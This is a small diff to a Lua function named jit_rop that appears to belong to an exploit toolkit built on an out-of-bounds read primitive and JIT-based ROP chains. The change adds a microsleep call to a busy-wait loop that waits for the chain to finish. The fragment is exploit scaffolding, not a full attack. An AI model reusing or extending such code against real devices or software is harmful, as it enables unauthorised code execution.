@@ -291,7 +291,10 @@ function jit_rop(address, rax, arg1, arg2, arg3, arg4, arg5, arg6)
     push_chain(JIT_ROP_CHAIN_START)
     
     -- Wait until JIT ROP chain finishes
-    while read64(JIT_ROP_CHAIN_END + 0x8) ~= JIT_ROP_CHAIN_END do end
+    while read64(JIT_ROP_CHAIN_END + 0x8) ~= JIT_ROP_CHAIN_END do 
+        -- Add micro bump to make GC happy
+        microsleep(100)
+    end
     
     return read64(OOB_SCRATCH_BASE + 0x2000)
     
